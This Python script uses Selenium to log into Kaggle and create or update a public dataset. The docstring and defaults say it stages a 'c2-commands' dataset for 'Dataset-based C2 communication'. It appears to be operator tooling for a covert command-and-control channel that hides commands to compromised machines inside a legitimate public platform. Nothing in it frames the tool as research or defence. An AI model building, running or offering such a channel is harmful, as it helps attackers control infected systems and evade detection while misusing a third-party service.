#!/usr/bin/env python3
"""
Create Kaggle Dataset via Selenium

Creates c2-commands dataset for Dataset-based C2 communication.
"""

import os
import sys
import time
import json
from pathlib import Path


def create_dataset_selenium(
    dataset_name: str,
    dataset_dir: str,
    username: str,
    password: str,
    public: bool = True,
    headless: bool = True
) -> dict:
    """
    Create Kaggle dataset via Selenium UI.
    
    Args:
        dataset_name: Name of dataset
        dataset_dir: Directory with dataset files
        username: Kaggle username
        password: Kaggle password
        public: Make dataset public
        headless: Run browser in headless mode
    
    Returns:
        Dict with status and dataset URL
    """
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.chrome.service import Service
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        from selenium.webdriver.common.keys import Keys
        from selenium.webdriver.common.action_chains import ActionChains
    except ImportError:
        return {"error": "Selenium not installed. Run: pip install selenium"}
    
    # Setup Chrome
    options = Options()
    if headless:
        options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    
    try:
        driver = webdriver.Chrome(options=options)
        wait = WebDriverWait(driver, 30)
        
        # Login
        print("[SELENIUM] Logging in...")
        driver.get("https://www.kaggle.com/account/login")
        
        # Wait for form
        email_input = wait.until(EC.presence_of_element_located((By.NAME, "email")))
        password_input = driver.find_element(By.NAME, "password")
        
        email_input.send_keys(username)
        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)
        
        time.sleep(5)
        
        # Go to dataset creation page
        print("[SELENIUM] Creating dataset...")
        driver.get("https://www.kaggle.com/datasets/new")
        
        time.sleep(3)
        
        # Set dataset title
        title_input = wait.until(EC.presence_of_element_located((By.ID, "title-input")))
        title_input.clear()
        title_input.send_keys(dataset_name)
        
        # Upload files
        print("[SELENIUM] Uploading files...")
        upload_input = driver.find_element(By.CSS_SELECTOR, "input[type='file']")
        
        # Upload each file
        dataset_path = Path(dataset_dir)
        for f in dataset_path.iterdir():
            if f.is_file() and not f.name.startswith('.'):
                upload_input.send_keys(str(f.absolute()))
                time.sleep(2)
        
        # Set license
        try:
            license_select = driver.find_element(By.ID, "license-select")
            license_select.click()
            cc0_option = driver.find_element(By.XPATH, "//option[contains(text(), 'CC0')]")
            cc0_option.click()
        except:
            pass
        
        # Set visibility
        if public:
            try:
                public_radio = driver.find_element(By.CSS_SELECTOR, "input[value='public']")
                public_radio.click()
            except:
                pass
        
        # Create dataset
        print("[SELENIUM] Submitting...")
        create_button = wait.until(EC.element_to_be_clickable((By.ID, "create-dataset-button")))
        create_button.click()
        
        time.sleep(5)
        
        # Get dataset URL
        dataset_url = driver.current_url
        if "/datasets/" not in dataset_url:
            # Wait for redirect
            time.sleep(5)
            dataset_url = driver.current_url
        
        driver.quit()
        
        return {
            "status": "ok",
            "dataset_name": dataset_name,
            "url": dataset_url
        }
        
    except Exception as e:
        return {"error": str(e)}


def update_dataset_selenium(
    dataset_slug: str,
    dataset_dir: str,
    username: str,
    password: str,
    version_notes: str = "",
    headless: bool = True
) -> dict:
    """
    Update existing Kaggle dataset via Selenium UI.
    
    Args:
        dataset_slug: Dataset slug (username/dataset-name)
        dataset_dir: Directory with updated files
        username: Kaggle username
        password: Kaggle password
        version_notes: Notes for this version
        headless: Run browser in headless mode
    
    Returns:
        Dict with status
    """
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        from selenium.webdriver.common.keys import Keys
    except ImportError:
        return {"error": "Selenium not installed"}
    
    options = Options()
    if headless:
        options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--window-size=1920,1080")
    
    try:
        driver = webdriver.Chrome(options=options)
        wait = WebDriverWait(driver, 30)
        
        # Login
        print("[SELENIUM] Logging in...")
        driver.get("https://www.kaggle.com/account/login")
        
        email_input = wait.until(EC.presence_of_element_located((By.NAME, "email")))
        password_input = driver.find_element(By.NAME, "password")
        
        email_input.send_keys(username)
        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)
        
        time.sleep(5)
        
        # Go to dataset page
        print(f"[SELENIUM] Updating dataset: {dataset_slug}")
        driver.get(f"https://www.kaggle.com/datasets/{dataset_slug}")
        
        time.sleep(3)
        
        # Click "New Version" button
        try:
            new_version_btn = wait.until(EC.element_to_be_clickable(
                (By.XPATH, "//button[contains(text(), 'New Version')]")
            ))
            new_version_btn.click()
        except:
            # Try alternative button
            new_version_btn = driver.find_element(By.CSS_SELECTOR, "button[data-testid='new-version-button']")
            new_version_btn.click()
        
        time.sleep(2)
        
        # Upload files
        print("[SELENIUM] Uploading files...")
        upload_input = driver.find_element(By.CSS_SELECTOR, "input[type='file']")
        
        dataset_path = Path(dataset_dir)
        for f in dataset_path.iterdir():
            if f.is_file() and not f.name.startswith('.'):
                upload_input.send_keys(str(f.absolute()))
                time.sleep(2)
        
        # Add version notes
        if version_notes:
            try:
                notes_input = driver.find_element(By.ID, "version-notes")
                notes_input.send_keys(version_notes)
            except:
                pass
        
        # Submit
        print("[SELENIUM] Submitting...")
        submit_btn = wait.until(EC.element_to_be_clickable(
            (By.XPATH, "//button[contains(text(), 'Save')]")
        ))
        submit_btn.click()
        
        time.sleep(5)
        
        driver.quit()
        
        return {
            "status": "ok",
            "dataset_slug": dataset_slug,
            "version_notes": version_notes
        }
        
    except Exception as e:
        return {"error": str(e)}


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Create/Update Kaggle Dataset")
    parser.add_argument("action", choices=["create", "update"])
    parser.add_argument("--name", help="Dataset name")
    parser.add_argument("--slug", help="Dataset slug (for update)")
    parser.add_argument("--dir", required=True, help="Dataset directory")
    parser.add_argument("--username", default=os.environ.get("KAGGLE_USERNAME", ""))
    parser.add_argument("--password", default=os.environ.get("KAGGLE_PASSWORD", ""))
    parser.add_argument("--notes", default="", help="Version notes")
    parser.add_argument("--public", action="store_true")
    parser.add_argument("--no-headless", action="store_true")
    
    args = parser.parse_args()
    
    if not args.username or not args.password:
        print("Error: KAGGLE_USERNAME and KAGGLE_PASSWORD required")
        sys.exit(1)
    
    if args.action == "create":
        result = create_dataset_selenium(
            dataset_name=args.name or "c2-commands",
            dataset_dir=args.dir,
            username=args.username,
            password=args.password,
            public=args.public,
            headless=not args.no_headless
        )
    else:
        result = update_dataset_selenium(
            dataset_slug=args.slug or f"{args.username}/c2-commands",
            dataset_dir=args.dir,
            username=args.username,
            password=args.password,
            version_notes=args.notes,
            headless=not args.no_headless
        )
    
    print(json.dumps(result, indent=2))
